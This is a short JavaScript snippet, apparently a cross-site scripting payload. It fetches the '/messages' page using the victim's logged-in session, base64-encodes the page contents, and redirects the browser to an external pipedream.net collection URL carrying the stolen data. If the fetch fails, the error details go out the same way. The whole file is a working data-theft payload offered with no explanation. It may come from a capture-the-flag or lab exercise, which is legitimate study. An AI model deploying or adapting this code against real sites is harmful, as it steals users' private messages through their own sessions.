(async function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";

  function safeB64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }

  const url = "/messages";
  try {
    const res = await fetch(url, { method: "GET", credentials: "include" });
    const txt = await res.text(); // lire le corps en string
    const payload = encodeURIComponent(safeB64(txt));
    document.location = END + "?p=" + payload;
  } catch (err) {
    const payload = encodeURIComponent(safeB64(String(err && err.stack ? err.stack : err)));
    document.location = END + "?err=" + payload;
  }
})();
